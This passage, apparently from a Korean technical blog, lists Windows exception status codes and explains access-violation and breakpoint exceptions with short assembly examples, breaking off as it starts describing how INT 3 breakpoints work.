punctuation\">)</span><span class=\"token number\">0x00000080L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_USER_APC</span>                  <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x000000C0L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_TIMEOUT</span>                   <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x00000102L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_PENDING</span>                   <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x00000103L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_EXCEPTION_HANDLED</span>            <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x00010001L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_CONTINUE</span>                     <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x00010002L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_SEGMENT_NOTIFICATION</span>      <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x40000005L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_FATAL_APP_EXIT</span>            <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x40000015L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_REPLY_LATER</span>                  <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x40010001L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_TERMINATE_THREAD</span>             <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x40010003L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_TERMINATE_PROCESS</span>            <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x40010004L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_CONTROL_C</span>                    <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x40010005L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_PRINTEXCEPTION_C</span>             <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x40010006L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_RIPEXCEPTION</span>                 <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x40010007L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_CONTROL_BREAK</span>                <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x40010008L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_COMMAND_EXCEPTION</span>            <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x40010009L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_PRINTEXCEPTION_WIDE_C</span>        <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x4001000AL</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_GUARD_PAGE_VIOLATION</span>      <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x80000001L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_DATATYPE_MISALIGNMENT</span>     <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x80000002L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_BREAKPOINT</span>                <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x80000003L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_SINGLE_STEP</span>               <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x80000004L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_LONGJUMP</span>                  <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x80000026L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_UNWIND_CONSOLIDATE</span>        <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x80000029L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DBG_EXCEPTION_NOT_HANDLED</span>        <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x80010001L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_ACCESS_VIOLATION</span>          <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000005L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_IN_PAGE_ERROR</span>             <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000006L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_INVALID_HANDLE</span>            <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000008L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_INVALID_PARAMETER</span>         <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC000000DL</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_NO_MEMORY</span>                 <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000017L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_ILLEGAL_INSTRUCTION</span>       <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC000001DL</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_NONCONTINUABLE_EXCEPTION</span>  <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000025L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_INVALID_DISPOSITION</span>       <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000026L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_ARRAY_BOUNDS_EXCEEDED</span>     <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC000008CL</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_FLOAT_DENORMAL_OPERAND</span>    <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC000008DL</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_FLOAT_DIVIDE_BY_ZERO</span>      <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC000008EL</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_FLOAT_INEXACT_RESULT</span>      <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC000008FL</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_FLOAT_INVALID_OPERATION</span>   <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000090L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_FLOAT_OVERFLOW</span>            <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000091L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_FLOAT_STACK_CHECK</span>         <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000092L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_FLOAT_UNDERFLOW</span>           <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000093L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_INTEGER_DIVIDE_BY_ZERO</span>    <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000094L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_INTEGER_OVERFLOW</span>          <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000095L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_PRIVILEGED_INSTRUCTION</span>    <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000096L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_STACK_OVERFLOW</span>            <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC00000FDL</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_DLL_NOT_FOUND</span>             <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000135L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_ORDINAL_NOT_FOUND</span>         <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000138L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_ENTRYPOINT_NOT_FOUND</span>      <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000139L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_CONTROL_C_EXIT</span>            <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC000013AL</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_DLL_INIT_FAILED</span>           <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000142L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_FLOAT_MULTIPLE_FAULTS</span>     <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC00002B4L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_FLOAT_MULTIPLE_TRAPS</span>      <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC00002B5L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_REG_NAT_CONSUMPTION</span>       <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC00002C9L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_HEAP_CORRUPTION</span>           <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000374L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_STACK_BUFFER_OVERRUN</span>      <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000409L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_INVALID_CRUNTIME_PARAMETER</span> <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000417L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_ASSERTION_FAILURE</span>         <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000420L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_ENCLAVE_VIOLATION</span>         <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC00004A2L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_INTERRUPTED</span>               <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000515L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_THREAD_NOT_RUNNING</span>        <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000516L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_ALREADY_REGISTERED</span>        <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000718L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\"><span class=\"token function\">defined</span><span class=\"token punctuation\">(</span>STATUS_SUCCESS<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>_WIN32_WINNT <span class=\"token operator\">></span> <span class=\"token number\">0x0500</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>_WIN32_FUSION <span class=\"token operator\">>=</span> <span class=\"token number\">0x0100</span><span class=\"token punctuation\">)</span> </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_SXS_EARLY_DEACTIVATION</span>    <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC015000FL</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_SXS_INVALID_DEACTIVATION</span>  <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0150010L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></code></pre></div>\n<h3 id=\"status_access_violation--dword---0xc0000005l\" style=\"position:relative;\"><a href=\"#status_access_violation--dword---0xc0000005l\" aria-label=\"status_access_violation  dword   0xc0000005l permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>STATUS_ACCESS_VIOLATION  (DWORD   )0xC0000005L</h3>\n<ul>\n<li>존재하지 않거나 접근 권하니 없는 메모리 영역에 대해서 접근을 시도할 때 발생하는 예외</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">MOV DWORD PTR DS<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span>\n<span class=\"token operator\">=</span><span class=\"token operator\">></span> 메모리 주소 <span class=\"token number\">0</span>은 할당된 영역이 아니다<span class=\"token punctuation\">.</span>\n\nADD DWORD PTR DS<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x401000</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span>\n<span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">.</span>text 섹션의 시작 주소 <span class=\"token number\">0x401000</span>은 READ 속성만을 가지고 있다<span class=\"token punctuation\">.</span> <span class=\"token punctuation\">(</span>WRITE 속성 없음<span class=\"token punctuation\">)</span>\n\nXOR DWORD PTR DS<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">80000000</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1234</span>\n<span class=\"token operator\">=</span><span class=\"token operator\">></span> 메모리 주소 <span class=\"token number\">0x80000000</span> 은 Kernel 영역이라 user 모드에선 접근 불가</code></pre></div>\n<h3 id=\"status_breakpoint-dword---0x80000003l\" style=\"position:relative;\"><a href=\"#status_breakpoint-dword---0x80000003l\" aria-label=\"status_breakpoint dword   0x80000003l permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>STATUS_BREAKPOINT (DWORD   )0x80000003L</h3>\n<ul>\n<li>실행 코드에 BP가 설치되면 CPU가 그 주소를 실행하려 할 때 EXCEPTION_BREAKPOINT 예외가 발생한다.</li>\n<li>디버거는 바로 이 EXCEPTION_BREAKPOINT 예외를 이용하여 BP 기능을 제공하는 것이다.</li>\n</ul>\n<h2 id=\"breakpoint-구현-방법\" style=\"position:relative;\"><a href=\"#breakpoint-%EA%B5%AC%ED%98%84-%EB%B0%A9%EB%B2%95\" aria-label=\"breakpoint 구현 방법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>BreakPoint 구현 방법</h2>\n<h3 id=\"int-3\" style=\"position:relative;\"><a href=\"#int-3\" aria-label=\"int 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>INT 3</h3>\n<ul>\n<li>BP를 설치하는 명령어는 